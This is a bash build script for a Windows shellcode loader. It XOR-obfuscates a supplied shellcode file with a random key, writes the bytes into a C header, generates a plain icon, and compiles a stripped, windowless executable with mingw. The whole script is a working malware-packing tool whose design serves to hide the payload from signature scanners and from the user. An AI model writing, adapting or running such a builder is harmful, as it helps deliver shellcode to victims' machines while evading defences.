#!/usr/bin/env bash
# Build the Windows loader: XOR-wrap a shellcode file, render payload.h from the
# template, compile to a stripped GUI exe.
#
# usage: build.sh <shellcode.bin> <out.exe>
set -euo pipefail

SHELLCODE="${1:?usage: build.sh <shellcode.bin> <out.exe>}"
OUT="${2:?usage: build.sh <shellcode.bin> <out.exe>}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

CC="${CC:-x86_64-w64-mingw32-gcc}"
WINDRES="${WINDRES:-x86_64-w64-mingw32-windres}"

for tool in "$CC" "$WINDRES"; do
  command -v "$tool" >/dev/null 2>&1 || { echo "missing tool: $tool" >&2; exit 1; }
done

[ -f "$SHELLCODE" ] || { echo "no such shellcode: $SHELLCODE" >&2; exit 1; }

KEY=$(python3 -c 'import random; k=random.randrange(1,256); print(k)')

python3 - "$SHELLCODE" "$KEY" "$DIR/payload.h.tmpl" "$DIR/payload.h" <<'PY'
import sys

src, key, tmpl, out = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
data = open(src, "rb").read()
xored = bytes(b ^ key for b in data)
rows = []
for i in range(0, len(xored), 16):
    rows.append("    " + ", ".join("0x%02x" % b for b in xored[i:i + 16]))
body = ",\n".join(rows)
text = open(tmpl).read().replace("__KEY__", "%02x" % key).replace("__BYTES__", body)
open(out, "w").write(text)
PY

if [ ! -f "$DIR/icon.ico" ]; then
  python3 - "$DIR/icon.ico" <<'PY'
import struct, sys
# 16x16 32bpp ICO, solid dark-blue square.
w = h = 16
pixels = b"".join(bytes((0x2f, 0x81, 0xf7, 0xff)) * w for _ in range(h))
bmp_header = struct.pack("<IiiHHIIiiII", 40, w, h * 2, 1, 32, 0, len(pixels), 0, 0, 0, 0)
and_mask = b"\x00" * (w // 8 * h)
image = bmp_header + pixels + and_mask
ico = struct.pack("<HHH", 0, 1, 1)
ico += struct.pack("<BBBBHHII", w, h, 0, 0, 1, 32, len(image), 22)
ico += image
open(sys.argv[1], "wb").write(ico)
PY
fi

( cd "$DIR" && "$WINDRES" icon.rc -O coff -o icon.o )
"$CC" -O2 -s -mwindows -fno-asynchronous-unwind-tables -o "$OUT" "$DIR/loader.c" "$DIR/icon.o"
echo "built $OUT ($(stat -c%s "$OUT") bytes)"
